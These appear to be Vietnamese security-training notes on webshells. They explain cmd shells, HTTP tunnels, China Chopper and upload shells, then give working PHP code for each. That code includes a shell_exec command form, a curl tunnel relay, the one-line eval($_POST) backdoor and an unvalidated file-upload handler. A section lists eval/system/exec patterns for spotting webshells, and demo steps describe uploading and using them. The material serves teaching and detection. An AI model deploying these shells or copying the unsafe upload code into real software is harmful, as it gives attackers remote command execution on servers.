# Lý thuyết

1. Webshell

- Webshell là một loại phần mềm độc hại được sử dụng để kiểm soát máy tính nạn nhân qua các dòng lệnh, được viết bằng các ngôn ngữ như PHP, ASP, JSP, Perl, Python, và Ruby. Webshell cho phép kẻ tấn công thực hiện một số hành động như thêm, xóa, sửa đổi tệp, thực thi mã độc hại, thu thập thông tin nạn nhân và có thể kiểm soát máy nạn nhân.

- Khi máy chủ đã bị nhiễm webshell, kẻ tấn công sẽ truy cập vào máy nạn nhân từ xa qua trình duyệt web hoặc các công cụ quản lý tệp.

2. Các loại webshell

2.1. Cmd shell

- Cmd shell là một loại webshell có khả năng thực thi các dòng lệnh thông qua giao diện dòng lệnh của hệ điều hành(thường dùng hàm shell_exec).

2.2. Http tunnel

- HTTP Tunnel là một loại webshell đặc biệt sử dụng giao thức HTTP để truyền tải các lệnh từ kẻ tấn công đến máy chủ và nhận kết quả trả về thông qua các yêu cầu HTTP. Đây là một loại webshell có khả năng vượt qua các giới hạn về tường lửa hoặc các cơ chế an ninh mạng chặn các kết nối bất thường.

2.3. Chooper

- Chooper cho phép tấn công, thực hiện các hoạt động độc hại và kiểm soát từ xa các hệ thống mà đã được xâm nhập. Chooper có kích thước nhỏ nên khó phát hiện.

2.4. Upload shell

- Upload shell là một kỹ thuật tấn công trong đó kẻ tấn công tải lên một webshell (một đoạn mã độc) lên máy chủ mục tiêu thông qua tính năng tải file của một ứng dụng web. Khi webshell được tải lên thành công và thực thi, nó cho phép kẻ tấn công điều khiển máy chủ từ xa, thực hiện các lệnh hệ thống, truy cập file, hoặc cài đặt phần mềm độc hại.

# Bài tập

1. Cmd shell

```
<?php
if (isset($_POST['cmd'])) {
    $command = $_POST['cmd'];
    $output = shell_exec($command);
    echo "<pre>$output</pre>";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP CmdShell</title>
</head>
<body>
    <form method="POST">
        <label for="cmd">Nhập lệnh shell:</label><br>
        <input type="text" name="cmd" id="cmd" required><br>
        <input type="submit" value="Thực thi">
    </form>
</body>
</html>
```

2. Http Tunnel

- Webshell

```
<?php
if (isset($_POST['cmd'])) {
    $command = $_POST['cmd'];
    $output = shell_exec($command);
    echo $output;
}
?>
```

- Server

```
<?php
$url = 'http://localhost/Challenge10-AnhNT/uploads/teacher/Payload.php';
$command = $_POST['cmd'];
$data = [
    'cmd' => $command,
];
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
$response = curl_exec($ch);
curl_close($ch);
echo $response;
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP CmdShell</title>
</head>
<body>
    <form method="POST">
        <label for="cmd">Nhập lệnh shell:</label><br>
        <input type="text" name="cmd" id="cmd" required><br>
        <input type="submit" value="Thực thi">
    </form>
</body>
</html>
```

3. Chooper

```
<?php @eval($_POST['shell']);?>
```

4. Upload shell

```
<?php
if($_SERVER['REQUEST_METHOD'] === 'POST'){
    $targetDir = 'upload';
    $targetFile = $targetDir . basename($_FILES['userfile']['name']);

    if(move_uploaded_file($_FILES['userfile']['tmp_name'], $targetFile)){
        header("Location: $targetFile");
        exit;
    }
}
?>
<form enctype="multipart/form-data" action="" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="100000">
    Send this file: <input name="userfile" type="file">
    <input type="submit" value="Send">
</form>
```

# Các pattern

1. File PHP
- eval(): webshell eval thực thi lệnh do hacker truyền vào qua các biến trong request. Ví dụ <?php eval($_GET('a')); ?>.
    - eval($_GET('string')); eval($_POST('string')); eval($_REQUEST('string'))
    - eval(encode string)
    - eval('response = '+response+';').
    - eval('$string = '.$string. ';').
    - eval($filter) (bắt từ chuỗi simpleEval($filter)).
    - 'Eval(&$item, &$dataType)', 'Eval($item[$key], $dataType)', 'Eval($value)','Eval($filters, $dataType)'
- $recursive0($params, $level+1)', '$recursive0($params)'
- exec ('sassc -t compressed -I '.$cwd.$bootstrapPath.' -I '.$cwd.portal()
- System()
    - system('/u01/colombo/usr/bin/php -c /u01/colombo/etc/php.ini /u01/colombo/www/crontab/runService.php 59721 Education.CourseResult.Exam.autoMarkExamAll')
    - system("perl ./api/syslog-send.pl \"Syslog filter for ".$fil["mf_log"]." updated by".read_session('SesAccount')."\"");
- curl_exec($ch)
- exec("ifconfig | grep -Eo 'inet (addr:)'
- $class(sfContext::getInstance()
2. Trường hợp file aspx, asp, cs
- eval() Thực thi lệnh truyền vào từ request. Dữ liệu được lấy từ request bằng cách Request.Item['a']
    - eval("DATE_DEBIT")
    - eval(Container.DataItem, "CategoryName")
    - eval("CreatTime", "{0:dd/MM/yyyy (HH:mm:ss),
    - eval("AMT_PAY","{0:#,##0}")  

# Demo

- Cmdshell

    - Sau khi upload webshell lên máy chủ, truy cập vào đường dẫn chứa webshell và gõ lệnh muốn dùng.
 
    <img src = 'https://github.com/NTA06012004/BC-training/blob/main/Week%2012/File%20PNG/1.png'>

- Http tunnel

    - Sau khi upload webshell lên máy chủ, ở phía server gõ lệnh muốn dùng.
 
    <img src = 'https://github.com/NTA06012004/BC-training/blob/main/Week%2012/File%20PNG/2.png'> 
